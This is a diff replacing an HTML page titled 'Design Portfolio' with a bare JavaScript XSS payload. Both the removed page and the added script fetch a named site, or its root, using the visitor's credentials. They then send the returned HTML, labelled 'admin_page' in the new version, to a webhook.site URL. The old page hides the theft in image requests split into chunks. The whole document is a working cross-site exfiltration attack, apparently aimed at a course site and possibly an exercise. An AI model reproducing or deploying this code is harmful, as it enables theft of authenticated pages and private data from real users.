@@ -1,92 +1,41 @@
 
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Design Portfolio</title>
-</head>
-<body>
-    <h1>Design Portfolio</h1>
-    <pre id="log"></pre>
+(async () => {
+    const webhook =
+        "https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76";
 
-    <script>
-    const webhook = "https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76";
-    const target = "https://cats.is-course.ru/";
-    const log = document.getElementById("log");
+    const report = (data) => {
+        fetch(webhook, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "text/plain"
+            },
+            body: JSON.stringify(data)
+        });
+    };
 
-    function report(event, data = {}) {
-        const url = new URL(webhook);
+    report({
+        event: "xss_started",
+        origin: location.origin,
+        url: location.href
+    });
 
-        url.searchParams.set("event", event);
-        url.searchParams.set("data", JSON.stringify(data));
-        url.searchParams.set("t", Date.now());
-
-        const img = new Image();
-        img.src = url.toString();
-
-        log.textContent += event + ": " +
-            JSON.stringify(data) + "\n";
-    }
-
-    function sendHtml(html) {
-        // Передаём HTML частями, чтобы не превысить
-        // максимальную длину URL.
-        const chunkSize = 900;
-        const total = Math.ceil(html.length / chunkSize);
-
-        for (let i = 0; i < total; i++) {
-            const url = new URL(webhook);
-
-            url.searchParams.set("event", "html_chunk");
-            url.searchParams.set("part", i);
-            url.searchParams.set("total", total);
-            url.searchParams.set(
-                "data",
-                html.slice(
-                    i * chunkSize,
-                    (i + 1) * chunkSize
-                )
-            );
-
-            const img = new Image();
-            img.src = url.toString();
-        }
-    }
-
-    async function main() {
-        report("started", {
-            url: location.href,
-            referrer: document.referrer,
-            userAgent: navigator.userAgent
+    try {
+        const response = await fetch("/", {
+            credentials: "include"
         });
 
-        try {
-            const response = await fetch(target, {
-                method: "GET",
-                credentials: "include",
-                mode: "cors",
-                cache: "no-store"
-            });
+        const html = await response.text();
 
-            const html = await response.text();
-
-            report("fetch_success", {
-                status: response.status,
-                length: html.length,
-                preview: html.slice(0, 300)
-            });
-
-            sendHtml(html);
-
-        } catch (err) {
-            report("fetch_failed", {
-                name: err.name,
-                message: err.message
-            });
-        }
+        report({
+            event: "admin_page",
+            status: response.status,
+            html: html
+        });
+    } catch (e) {
+        report({
+            event: "error",
+            message: e.message
+        });
     }
-
-    main();
-    </script>
-</body>
-</html>
+})();
